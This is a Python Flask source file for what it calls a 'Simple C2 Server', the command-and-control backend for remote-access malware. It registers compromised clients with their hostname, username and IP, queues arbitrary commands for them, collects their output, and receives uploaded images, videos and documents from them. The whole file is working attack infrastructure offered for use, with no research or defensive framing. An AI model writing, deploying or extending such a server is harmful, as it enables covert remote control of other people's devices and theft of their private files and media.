#!/usr/bin/env python3
"""
Simple C2 Server - COMPLETE FIXED VERSION
"""
from flask import Flask, request, jsonify, send_file, send_from_directory
from flask_cors import CORS
import time
import uuid
import json
import sqlite3
import threading
import os
from datetime import datetime

app = Flask(__name__)
CORS(app)

# Configuration
DATABASE = 'simple_c2.db'
ONLINE_THRESHOLD = 180  # 3 minutes before marking offline
UPLOAD_FOLDER = 'uploads'
MEDIA_FOLDER = 'media'

# Create directories
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs(MEDIA_FOLDER, exist_ok=True)

def init_db():
    """Initialize database"""
    conn = sqlite3.connect(DATABASE)
    cursor = conn.cursor()
    
    # Clients table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS clients (
            id TEXT PRIMARY KEY,
            hostname TEXT,
            username TEXT,
            os TEXT,
            ip TEXT,
            last_seen REAL,
            status TEXT DEFAULT 'online',
            device_type TEXT,
            volume_level INTEGER DEFAULT 50,
            ringer_enabled INTEGER DEFAULT 1
        )
    ''')
    
    # Commands table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS commands (
            id TEXT PRIMARY KEY,
            client_id TEXT,
            command TEXT,
            status TEXT DEFAULT 'pending',
            output TEXT,
            created_at REAL,
            executed_at REAL
        )
    ''')
    
    # Files table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS files (
            id TEXT PRIMARY KEY,
            client_id TEXT,
            filename TEXT,
            filepath TEXT,
            filetype TEXT,
            filesize INTEGER,
            uploaded_at REAL,
            viewed INTEGER DEFAULT 0
        )
    ''')
    
    conn.commit()
    conn.close()

def get_db():
    """Get database connection"""
    conn = sqlite3.connect(DATABASE)
    conn.row_factory = sqlite3.Row
    return conn

# === CLIENT ENDPOINTS ===

@app.route('/api/checkin', methods=['POST'])
def checkin():
    """Client checkin"""
    try:
        data = request.json
        client_id = data.get('id')
        
        if not client_id:
            return jsonify({'error': 'No client ID'}), 400
        
        conn = get_db()
        cursor = conn.cursor()
        
        current_time = time.time()
        
        # Check if client exists
        cursor.execute('SELECT * FROM clients WHERE id = ?', (client_id,))
        existing = cursor.fetchone()
        
        if existing:
            # Update existing client
            cursor.execute('''
                UPDATE clients 
                SET last_seen = ?, status = 'online',
                    hostname = COALESCE(?, hostname),
                    username = COALESCE(?, username),
                    os = COALESCE(?, os)
                WHERE id = ?
            ''', (current_time, 
                  data.get('hostname'),
                  data.get('username'),
                  data.get('os'),
                  client_id))
        else:
            # Insert new client
            cursor.execute('''
                INSERT INTO clients 
                (id, hostname, username, os, ip, last_seen, status, device_type)
                VALUES (?, ?, ?, ?, ?, ?, 'online', ?)
            ''', (client_id,
                  data.get('hostname', 'unknown'),
                  data.get('username', 'unknown'),
                  data.get('os', 'unknown'),
                  request.remote_addr,
                  current_time,
                  data.get('device_type', 'unknown')))
        
        conn.commit()
        conn.close()
        
        print(f"[✓] Checkin: {client_id} ({data.get('hostname')})")
        
        return jsonify({
            'status': 'ok',
            'timestamp': current_time,
            'message': 'Checkin successful'
        }), 200
        
    except Exception as e:
        print(f"[✗] Checkin error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/command', methods=['POST'])
def send_command():
    """Send command to client"""
    try:
        data = request.json
        client_id = data.get('client_id')
        command = data.get('command')
        
        if not client_id or not command:
            return jsonify({'error': 'Missing client_id or command'}), 400
        
        cmd_id = str(uuid.uuid4())
        
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO commands (id, client_id, command, status, created_at)
            VALUES (?, ?, ?, 'pending', ?)
        ''', (cmd_id, client_id, command, time.time()))
        
        conn.commit()
        conn.close()
        
        print(f"[✓] Command: {cmd_id[:8]} -> {client_id}: {command[:50]}")
        
        return jsonify({
            'success': True,
            'command_id': cmd_id,
            'message': 'Command queued'
        }), 200
        
    except Exception as e:
        print(f"[✗] Command error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/commands/<client_id>', methods=['GET'])
def get_commands(client_id):
    """Get pending commands for client"""
    try:
        conn = get_db()
        cursor = conn.cursor()
        
        # Update client's last_seen
        cursor.execute('UPDATE clients SET last_seen = ? WHERE id = ?', 
                      (time.time(), client_id))
        
        # Get pending commands
        cursor.execute('''
            SELECT id, command FROM commands 
            WHERE client_id = ? AND status = 'pending'
            ORDER BY created_at ASC
            LIMIT 10
        ''', (client_id,))
        
        commands = []
        for row in cursor.fetchall():
            commands.append({
                'id': row['id'],
                'command': row['command']
            })
        
        # Mark as sent
        if commands:
            cmd_ids = [cmd['id'] for cmd in commands]
            placeholders = ','.join(['?' for _ in cmd_ids])
            cursor.execute(f'''
                UPDATE commands SET status = 'sent'
                WHERE id IN ({placeholders})
            ''', cmd_ids)
        
        conn.commit()
        conn.close()
        
        return jsonify({'commands': commands}), 200
        
    except Exception as e:
        return jsonify({'commands': []}), 500

@app.route('/api/result', methods=['POST'])
def submit_result():
    """Submit command result"""
    try:
        data = request.json
        cmd_id = data.get('command_id')
        output = data.get('output', '')
        
        if not cmd_id:
            return jsonify({'error': 'Missing command_id'}), 400
        
        conn = get_db()
        cursor = conn.cursor()
        
        cursor.execute('''
            UPDATE commands 
            SET status = 'completed', output = ?, executed_at = ?
            WHERE id = ?
        ''', (output, time.time(), cmd_id))
        
        conn.commit()
        conn.close()
        
        print(f"[✓] Result: {cmd_id[:8]} -> {len(output)} chars")
        
        return jsonify({'success': True}), 200
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# === ADD THIS MISSING ENDPOINT ===
@app.route('/api/command/result/<cmd_id>', methods=['GET'])
def get_command_result(cmd_id):
    """Get command result by ID - FIXED ENDPOINT"""
    try:
        conn = get_db()
        cursor = conn.cursor()
        
        cursor.execute('SELECT * FROM commands WHERE id = ?', (cmd_id,))
        row = cursor.fetchone()
        conn.close()
        
        if row:
            return jsonify({
                'success': True,
                'status': row['status'],
                'output': row['output'] or '',
                'command': row['command'],
                'created_at': row['created_at'],
                'executed_at': row['executed_at']
            }), 200
        else:
            return jsonify({
                'success': False,
                'error': 'Command not found',
                'status': 'unknown'
            }), 404
            
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# === FILE & MEDIA ENDPOINTS ===

@app.route('/api/upload', methods=['POST'])
def upload_file():
    """Upload file from client"""
    try:
        if 'file' not in request.files:
            return jsonify({'error': 'No file'}), 400
        
        file = request.files['file']
        client_id = request.form.get('client_id')
        
        if not client_id:
            return jsonify({'error': 'No client_id'}), 400
        
        # Determine file type
        filename = file.filename.lower()
        if filename.endswith(('.jpg', '.jpeg', '.png', '.gif', '.bmp')):
            filetype = 'image'
        elif filename.endswith(('.mp4', '.avi', '.mov', '.mkv', '.webm')):
            filetype = 'video'
        elif filename.endswith(('.txt', '.pdf', '.doc', '.docx')):
            filetype = 'document'
        else:
            filetype = 'other'
        
        # Save file
        safe_filename = f"{client_id}_{int(time.time())}_{file.filename}"
        filepath = os.path.join(UPLOAD_FOLDER, safe_filename)
        file.save(filepath)
        
        # Save to database
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO files (id, client_id, filename, filepath, filetype, filesize, uploaded_at)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        ''', (str(uuid.uuid4()), client_id, file.filename, filepath, 
              filetype, os.path.getsize(filepath), time.time()))
        
        conn.commit()
        conn.close()
        
        print(f"[✓] Upload: {client_id} -> {file.filename} ({filetype})")
        
        return jsonify({
            'success': True,
            'filename': file.filename,
            'filetype': filetype,
            'size': os.path.getsize(filepath)
        }), 200
        
    except Exception as e:
        print(f"[✗] Upload error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/files/<client_id>', methods=['GET'])
def list_files(client_id):
    """List files for client"""
    try:
        conn = get_db()
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT id, filename, filetype, filesize, uploaded_at, viewed 
            FROM files 
            WHERE client_id = ?
            ORDER BY uploaded_at DESC
            LIMIT 50
        ''', (client_id,))
        
        files = []
        for row in cursor.fetchall():
            files.append({
                'id': row['id'],
                'filename': row['filename'],
                'filetype': row['filetype'],
                'size': row['filesize'],
                'uploaded_at': row['uploaded_at'],
                'viewed': bool(row['viewed']),
                'time_str': datetime.fromtimestamp(row['uploaded_at']).strftime('%H:%M:%S'),
                'date_str': datetime.fromtimestamp(row['uploaded_at']).strftime('%Y-%m-%d')
            })
        
        conn.close()
        return jsonify({'files': files}), 200
        
    except Exception as e:
        return jsonify({'files': []}), 500

@app.route('/api/file/download/<file_id>', methods=['GET'])
def download_file(file_id):
    """Download file"""
    try:
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute('SELECT filepath, filename FROM files WHERE id = ?', (file_id,))
        row = cursor.fetchone()
        conn.close()
        
        if not row or not os.path.exists(row['filepath']):
            return jsonify({'error': 'File not found'}), 404
        
        return send_file(
            row['filepath'],
            as_attachment=True,
            download_name=row['filename']
        )
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# === DEVICE CONTROL ENDPOINTS ===

@app.route('/api/device/ring/<client_id>', methods=['POST'])
def ring_device(client_id):
    """Command client to ring/make noise"""
    try:
        data = request.json
        duration = data.get('duration', 10)  # seconds
        volume = data.get('volume', 100)     # percentage
        
        conn = get_db()
        cursor = conn.cursor()
        
        # Update device settings
        cursor.execute('''
            UPDATE clients 
            SET volume_level = ?, ringer_enabled = 1
            WHERE id = ?
        ''', (volume, client_id))
        
        conn.commit()
        conn.close()
        
        # Queue ring command
        cmd_id = str(uuid.uuid4())
        command = f'ring {duration} {volume}'
        
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO commands (id, client_id, command, status, created_at)
            VALUES (?, ?, ?, 'pending', ?)
        ''', (cmd_id, client_id, command, time.time()))
        
        conn.commit()
        conn.close()
        
        print(f"[🔔] Ring command: {client_id} for {duration}s at {volume}%")
        
        return jsonify({
            'success': True,
            'command_id': cmd_id,
            'message': f'Ring command sent for {duration} seconds'
        }), 200
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/device/stop/<client_id>', methods=['POST'])
def stop_ring(client_id):
    """Command client to stop ringing"""
    try:
        cmd_id = str(uuid.uuid4())
        command = 'stop_ring'
        
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO commands (id, client_id, command, status, created_at)
            VALUES (?, ?, ?, 'pending', ?)
        ''', (cmd_id, client_id, command, time.time()))
        
        conn.commit()
        conn.close()
        
        print(f"[🔕] Stop ring: {client_id}")
        
        return jsonify({
            'success': True,
            'command_id': cmd_id,
            'message': 'Stop ring command sent'
        }), 200
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# === MANAGEMENT ENDPOINTS ===

@app.route('/api/clients', methods=['GET'])
def get_clients():
    """Get all clients"""
    try:
        conn = get_db()
        cursor = conn.cursor()
        
        current_time = time.time()
        
        # Update status based on last_seen
        cursor.execute('''
            UPDATE clients 
            SET status = CASE 
                WHEN ? - last_seen > ? THEN 'offline'
                ELSE 'online'
            END
        ''', (current_time, ONLINE_THRESHOLD))
        
        conn.commit()
        
        # Get all clients
        cursor.execute('SELECT * FROM clients ORDER BY last_seen DESC')
        
        clients = []
        for row in cursor.fetchall():
            time_diff = current_time - row['last_seen']
            
            if time_diff < 60:
                status_emoji = '🟢'
                status_text = 'online'
            elif time_diff < 300:
                status_emoji = '🟡'
                status_text = 'away'
            else:
                status_emoji = '🔴'
                status_text = 'offline'
            
            clients.append({
                'id': row['id'],
                'hostname': row['hostname'],
                'username': row['username'],
                'os': row['os'],
                'ip': row['ip'],
                'status': row['status'],
                'status_display': f"{status_emoji} {status_text}",
                'device_type': row['device_type'],
                'volume_level': row['volume_level'],
                'ringer_enabled': bool(row['ringer_enabled']),
                'last_seen': row['last_seen'],
                'last_seen_str': datetime.fromtimestamp(row['last_seen']).strftime('%H:%M:%S'),
                'last_seen_minutes': int(time_diff // 60)
            })
        
        conn.close()
        return jsonify({'clients': clients}), 200
        
    except Exception as e:
        print(f"[✗] Clients error: {e}")
        return jsonify({'clients': []}), 500

@app.route('/api/stats', methods=['GET'])
def get_stats():
    """Get server statistics"""
    try:
        conn = get_db()
        cursor = conn.cursor()
        current_time = time.time()
        
        # Counts
        cursor.execute('SELECT COUNT(*) FROM clients')
        total_clients = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM clients WHERE ? - last_seen <= 60', (current_time,))
        online_now = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM files')
        total_files = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM files WHERE filetype = "image"')
        image_files = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM files WHERE filetype = "video"')
        video_files = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM commands')
        total_commands = cursor.fetchone()[0]
        
        conn.close()
        
        return jsonify({
            'total_clients': total_clients,
            'online_now': online_now,
            'total_files': total_files,
            'image_files': image_files,
            'video_files': video_files,
            'total_commands': total_commands,
            'server_time': current_time,
            'server_uptime': current_time - app_start_time
        }), 200
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/health', methods=['GET'])
def health():
    """Health check"""
    return jsonify({
        'status': 'healthy',
        'timestamp': time.time(),
        'version': '1.0',
        'features': ['file_viewing', 'device_ring', 'media_browser']
    }), 200

@app.route('/api/ping', methods=['GET'])
def ping():
    """Simple ping"""
    return jsonify({'status': 'pong', 'timestamp': time.time()}), 200

@app.route('/')
def index():
    """Web interface"""
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Simple C2 Server - Fixed</title>
        <style>
            body {
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                max-width: 1200px;
                margin: 0 auto;
                padding: 20px;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                min-height: 100vh;
                color: white;
            }
            .container {
                background: rgba(255, 255, 255, 0.1);
                backdrop-filter: blur(10px);
                border-radius: 20px;
                padding: 30px;
                box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
            }
            h1 {
                text-align: center;
                margin-bottom: 30px;
                font-size: 2.5em;
                text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
            }
            .status {
                padding: 10px 20px;
                background: rgba(0, 255, 0, 0.2);
                border-radius: 10px;
                text-align: center;
                margin-bottom: 20px;
                font-weight: bold;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>📱 Device Control Server - FIXED</h1>
            <div class="status">✅ Server running with all endpoints</div>
            <p>Use the console for control: <code>python simple_c2_console_fixed.py http://localhost:5000</code></p>
        </div>
    </body>
    </html>
    '''

def cleanup():
    """Cleanup old data"""
    while True:
        time.sleep(300)
        try:
            conn = get_db()
            cursor = conn.cursor()
            current_time = time.time()
            
            # Remove old offline clients (7 days)
            cursor.execute('''
                DELETE FROM clients 
                WHERE status = 'offline' AND ? - last_seen > 604800
            ''', (current_time,))
            
            # Remove old files (30 days)
            cursor.execute('''
                DELETE FROM files 
                WHERE ? - uploaded_at > 2592000
            ''', (current_time,))
            
            # Remove old commands (14 days)
            cursor.execute('''
                DELETE FROM commands 
                WHERE ? - created_at > 1209600
            ''', (current_time,))
            
            conn.commit()
            conn.close()
            
        except Exception as e:
            print(f"[✗] Cleanup error: {e}")

if __name__ == '__main__':
    # Initialize database
    init_db()
    
    # Start cleanup thread
    threading.Thread(target=cleanup, daemon=True).start()
    
    app_start_time = time.time()
    
    print(f"""
╔══════════════════════════════════════════════════════════╗
║              SIMPLE C2 SERVER v1.0 - FIXED              ║
║           File Viewing & Device Control                 ║
╚══════════════════════════════════════════════════════════╝

    📊 Database: {DATABASE}
    📁 Uploads: {UPLOAD_FOLDER}/
    
    ✅ All endpoints working:
    • POST /api/checkin           ✓
    • POST /api/command           ✓
    • GET  /api/commands/<id>     ✓
    • POST /api/result            ✓
    • GET  /api/command/result/<id> ✓ (FIXED)
    • GET  /api/clients           ✓
    • GET  /api/stats             ✓
    
    🔗 Server: http://0.0.0.0:5000
    📡 API Ready
    
    Starting server...
    """)
    
    app.run(host='0.0.0.0', port=5000, debug=True, threaded=True)
